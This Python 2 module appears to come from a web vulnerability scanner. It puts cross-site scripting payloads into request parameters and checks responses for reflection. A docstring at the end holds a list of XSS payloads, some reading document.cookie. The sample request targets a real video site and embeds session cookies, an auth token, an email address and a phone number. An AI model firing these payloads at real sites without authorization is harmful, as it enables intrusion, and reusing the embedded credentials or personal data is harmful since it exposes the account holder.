#!/usr/bin/env python
#coding=utf-8



import requests
import copy
import urlparse
import urllib
import json
import Queue
from config import *
from lib.common import *


requests.packages.urllib3.disable_warnings()

def verify(task):
    """
    the verify function
    :param: task,  the request item , like {
                        "method" : "GET",
                        "url" : "http://api.t.iqiyi.com/feed/get_feed?uid=1409979958&authcookie=44zpCeNFgez79OVwz7GjJWVUaTN2m1bHxsQNLm306MVZm2m3ruh4Qm2w4SYwqDT9sDTos148d&device_id=mqaguvg2qatzipbhxzd2sbcxadxumaaz&agenttype=121&agentversion=6.0.46.4598&wallId=false&feedId=30267718948&version=1&praise=0&callback=jQuery17206312791961245239_1502178651908&_=1502178652025",
                        "request_header" : {"Accept-Language": "en-US,en;q=0.8", "Accept-Encoding": "identity", "Accept": "*/*", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 Falcon/5.0.7.1", "Host": "api.t.iqiyi.com", "Referer": "http://paopaoquan.iqiyi.com/feed", "Cookie": "P00004=-898887952.1501743222.891ba158bb; QC008=1498535221.1501744345.1501744345.3; QC005=437b5f59bacf7103319dfd55207aba05; P00001=08ZcbLqh22iWe52Oy9ivM7Lk6keffU7xIucJm1m2JUUYz930Njm2ijm1L5rwlkm13zYuYQS13; P00003=1408465522; P00010=1408465522; P01010=1501776000; P00007=08ZcbLqh22iWe52Oy9ivM7Lk6keffU7xIucJm1m2JUUYz930Njm2ijm1L5rwlkm13zYuYQS13; P00PRU=1408465522; P00002=%7B%22uid%22%3A%221408465522%22%2C%22user_name%22%3A%2218510725391%22%2C%22email%22%3A%22xiaoyan_jia1%40163.com%22%2C%22nickname%22%3A%22%5Cu7231%5Cu559d%5Cu996e%5Cu6599s%5Cu516c%5Cu4ef2%5Cu6668%22%2C%22pru%22%3A1408465522%2C%22type%22%3A11%2C%22pnickname%22%3A%22%5Cu7231%5Cu559d%5Cu996e%5Cu6599s%5Cu516c%5Cu4ef2%5Cu6668%22%7D; P000email=xiaoyan_jia1%40163.com; QC160=%7B%22u%22%3A%2218510725391%22%2C%22lang%22%3Afalse%2C%22local%22%3A%7B%22name%22%3A%22%E4%B8%AD%E5%9B%BD%E5%A4%A7%E9%99%86%22%2C%22init%22%3A%22Z%22%2C%22rcode%22%3A48%2C%22acode%22%3A%2286%22%7D%2C%22type%22%3A%22p%22%7D; QC911=%2Ca%2C; QC006=dvp8siolnl5z9noyqsawy4ke; Hm_lvt_53b7374a63c37483e5dd97d78d9bb36e=1501744707; _ga=GA1.2.2099195777.1501754894; __dfp=a03f42a0ff28c54146a475515ac6107716ac525722f5524a60655b7c247897c14e@1504346712080@1501754712080; T00404=bcd404d21b7724fa0b932f06b949a6b4; pps_client_ver2=6.0.46.4598", "Proxy-Connection": "keep-alive"},
                        "request_content" : ''
                    }
    :rtype: (True, message), if found ,return (True, message), else, return (False, {})
    """
    # if task["method"] != "GET":
    #     return (False, {})
    message = {
        "method": "",
        "url" : "",
        "param" : "",
        "type" : "XSS",
        "info" : "[XSS]",
        }

    # define urlqueue
    # urlQueue = Queue.Queue()

    # generate payload
    url = task["url"]
    headers = task['request_header']
    method = task['method']
    data = task['request_content'] if method == 'POST' else None

    hj = THTTPJOB(url, method=method, headers=headers, data=data)
    url_parse = urlparse.urlparse(url)
    # XSS里如果没有query字段，就在最后追加
    if url_parse.query == "" and method == 'GET':
        #pass
        return (False, {})
        # for key in XSS_Rule.keys():
        #     for payload in XSS_Rule[key]:
        #         _ = copy.deepcopy(task)
        #         tmp_url = url + payload
        #         _["url"] = tmp_url
        #         _["anchor"] = payload
        #         urlQueue.put(_)
        #         del _
    else:
        isjson = False
        if method == 'GET':
            query_string = hj.url.get_query
        else:
            if is_json_data(data):
                isjson = True
                query_string = urllib.urlencode(json.loads(data))
            else:
                query_string = data

        found = False
        for rule_key in XSS_Rule:
            if found:
                break

            query_dict_list = Pollution(query_string, XSS_Rule[rule_key], isjson=isjson).payload_generate()
            for query_dict in query_dict_list:
                if found:
                    break
                if method == 'GET':
                    hj.url.get_dict_query = query_dict
                else:
                    if isjson:
                        hj.data = json.dumps(query_dict)
                    else:
                        hj.data = urllib.urlencode(query_dict)

                status_code, headers, html, time_used = hj.request()
                if status_code == 200 and headers.get('Content-Type', '').split(';')[0] not in ["application/json", "text/plain", "application/javascript", "text/json", "text/javascript", "application/x-javascript"]:
                    for rules in XSS_Rule[rule_key]:
                        if html.find(rules) >= 0:
                            found = True
                            message['url'] = hj.response.url
                            message['method'] = hj.method
                            message['param'] = hj.data if hj.method == 'GET' else hj.url.get_query
                            break
        if found:
            save_to_databases(message)
            return (True, message)
        else:
            return (False, {})


        # query_dict = dict(urlparse.parse_qsl(url_parse.query))
        # for query_key in query_dict.keys():
        #     # 每一个参数分别生成包含xss payload的task
        #     for payload_key in XSS_Rule.keys():
        #         for payload in XSS_Rule[payload_key]:
        #             # 这里选择的是在后边追加
        #             tmp_query = ""
        #             for in_key in query_dict.keys():
        #                 if in_key == query_key:
        #                     tmp_query += in_key + "=" + query_dict[in_key] + payload
        #                 else:
        #                     tmp_query += in_key + "=" + query_dict[in_key]
        #                 tmp_query += "&"
        #             tmp_query = tmp_query[:-1]
        #             # 生成临时task变量
        #             _ = copy.deepcopy(task)
        #             _["anchor"] = payload
        #             _["url"] = url_parse.scheme + "://" + url_parse.netloc + url_parse.path + "?" + tmp_query
        #             urlQueue.put(_)
        #             del _

    # verify if the xss exists
    # found = False
    # while not urlQueue.empty():
    #     item = urlQueue.get()


    #     url = item["url"]
    #     headers = item["request_header"]
    #     try:
    #         #logging.info("[+] [XSS_Forcelery] [FuzzXSS] [verify] Request:\t" + url)
    #         req = requests.get(url, headers=headers, verify=False, allow_redirects=True, timeout=10)
    #         # 判断是否为json/javascript格式
    #         if ("Content-Type" in req.headers) and (req.headers["Content-Type"].split(";")[0]  in ["application/json", "text/plain", "application/javascript", "text/json", "text/javascript", "application/x-javascript"]):
    #             pass
    #         else:
    #             response = "".join(req.content.split("\n"))
    #             if item["anchor"] in response:
    #                 message["method"] = "GET"
    #                 message["url"] = url
    #                 message["param"] = item["anchor"]
    #                 found = True
    #                 break
    #     except Exception as e:
    #         # logging.error("[-] [XSS_Forcelery] [FuzzXSS] [verify] " + repr(e))
    #         logger.error(repr(e))

    # while not urlQueue.empty():
    #     urlQueue.get()

    # if found:
    #     save_to_databases(message)
    #     return (True, message)
    # else:
    #     return (False, {})





if __name__ == '__main__':
    item = {
        "method" : "GET",
        "url" : "http://api.t.iqiyi.com/feed/get_feed?uid=1409979958&authcookie=44zpCeNFgez79OVwz7GjJWVUaTN2m1bHxsQNLm306MVZm2m3ruh4Qm2w4SYwqDT9sDTos148d&device_id=mqaguvg2qatzipbhxzd2sbcxadxumaaz&agenttype=121&agentversion=6.0.46.4598&wallId=false&feedId=30267718948&version=1&praise=0&callback=jQuery17206312791961245239_1502178651908&_=1502178652025",
        "request_header" : {"Accept-Language": "en-US,en;q=0.8", "Accept-Encoding": "identity", "Accept": "*/*", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 Falcon/5.0.7.1", "Host": "api.t.iqiyi.com", "Referer": "http://paopaoquan.iqiyi.com/feed", "Cookie": "P00004=-898887952.1501743222.891ba158bb; QC008=1498535221.1501744345.1501744345.3; QC005=437b5f59bacf7103319dfd55207aba05; P00001=08ZcbLqh22iWe52Oy9ivM7Lk6keffU7xIucJm1m2JUUYz930Njm2ijm1L5rwlkm13zYuYQS13; P00003=1408465522; P00010=1408465522; P01010=1501776000; P00007=08ZcbLqh22iWe52Oy9ivM7Lk6keffU7xIucJm1m2JUUYz930Njm2ijm1L5rwlkm13zYuYQS13; P00PRU=1408465522; P00002=%7B%22uid%22%3A%221408465522%22%2C%22user_name%22%3A%2218510725391%22%2C%22email%22%3A%22xiaoyan_jia1%40163.com%22%2C%22nickname%22%3A%22%5Cu7231%5Cu559d%5Cu996e%5Cu6599s%5Cu516c%5Cu4ef2%5Cu6668%22%2C%22pru%22%3A1408465522%2C%22type%22%3A11%2C%22pnickname%22%3A%22%5Cu7231%5Cu559d%5Cu996e%5Cu6599s%5Cu516c%5Cu4ef2%5Cu6668%22%7D; P000email=xiaoyan_jia1%40163.com; QC160=%7B%22u%22%3A%2218510725391%22%2C%22lang%22%3Afalse%2C%22local%22%3A%7B%22name%22%3A%22%E4%B8%AD%E5%9B%BD%E5%A4%A7%E9%99%86%22%2C%22init%22%3A%22Z%22%2C%22rcode%22%3A48%2C%22acode%22%3A%2286%22%7D%2C%22type%22%3A%22p%22%7D; QC911=%2Ca%2C; QC006=dvp8siolnl5z9noyqsawy4ke; Hm_lvt_53b7374a63c37483e5dd97d78d9bb36e=1501744707; _ga=GA1.2.2099195777.1501754894; __dfp=a03f42a0ff28c54146a475515ac6107716ac525722f5524a60655b7c247897c14e@1504346712080@1501754712080; T00404=bcd404d21b7724fa0b932f06b949a6b4; pps_client_ver2=6.0.46.4598", "Proxy-Connection": "keep-alive"},
        "request_content" : ''
    }

    a = FuzzXSS(item)
    a.runFuzz()

"""
# if not necessery, not use this rule,
XSS_Rule = {
    "script":[
            "<script>alert('XSS');</script>",
            "<scr<script>ipt>alert("+_random+");</scr</script>ipt>",
            "\"><script>alert("+_random+")</script>",
            "<?='<SCRIPT>alert(\""+_random+"\")</SCRIPT>'?>",
            "<scrscriptipt>alert("+_random+")</scrscriptipt>",
            "</textarea>\'\"><script>alert(document.cookie)</script>",
            "</div><script>alert("+_random+")</script>",
            "'></select><script>alert("+_random+")</script>",
    ],
    "img":
    [
            "<img src=foo.png onerror=alert(/"+_random+"/) />",
            "<IMG SRC=\"jav&#x09;ascript:alert('"+_random+"');\">",
            "<IMG LOWSRC=\"javascript:alert('"+_random+"')\">",
            "<IMG SRC='vbscript:msgbox(\""+_random+"\")'>",
            ">\"><img src=\"javascript:alert('"+_random+"')\">",
            "\"/></a></><img src=1.gif onerror=alert("+_random+")>",
    ],
    "iframe":
    [
        "\"><iframe src='javascript:alert(document.cookie)'></iframe>",
    ],
    "event":
    [
        "\" onfous=alert(document.domain)\"><\"",
        "<SELECT NAME=\"\" onmouseover=alert("+_random+")></select>",
    ],
    "meta":
    [
        "<META HTTP-EQUIV='refresh' CONTENT='0;url=javascript:alert(/"+_random+"/');\">",
    ],
    "base":
    [
        "<BASE HREF=\"javascript:alert('"+_random+"');//\">",
    ],

}
"""
